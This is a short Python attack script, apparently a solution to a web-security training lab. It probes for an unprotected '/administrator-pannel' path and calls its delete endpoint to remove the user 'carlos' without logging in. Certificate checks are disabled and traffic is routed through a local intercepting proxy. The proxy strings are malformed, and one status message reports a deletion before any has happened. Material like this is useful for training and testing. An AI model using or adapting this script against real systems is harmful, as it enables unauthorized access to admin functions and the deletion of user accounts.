import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies={'http': 'http:127.0.0.1:8080','https': 'http:127.0.0.1:8080'}

def delete_user(url):
    admin_pannel_url = url + '/administrator-pannel'
    r = requests.get(admin_pannel_url,verify=False,proxies=proxies)
    if r.status_code == 200:
        print('(+)found administrator pannel!')
        print('(+) deleted administrator pannel')
        delete_carlos_url = admin_pannel_url + '/delete?username=carlos'
        r = requests.get(delete_carlos_url,verify=False,proxies=proxies)
        if r.status_code == 200:
            print('(+) carlos deleted successfully')
        else:
            print('(-)could not delete the user.')
    else:
        print('(-)could not find administrator pannel')
        print('(-)exiting the script')

def main():
    if len(sys.argv)!=2:
        print("(+)usage: %s <url>"%sys.argv[0])
        print("(+)example : %s wwww.example.com"%sys.argv[0])
        sys.exit(-1)
        
    url  = sys.argv[1]
    print("(+) Finding admin pannel...")
    delete_user(url)
    
    

if __name__ == '__main__':
    main()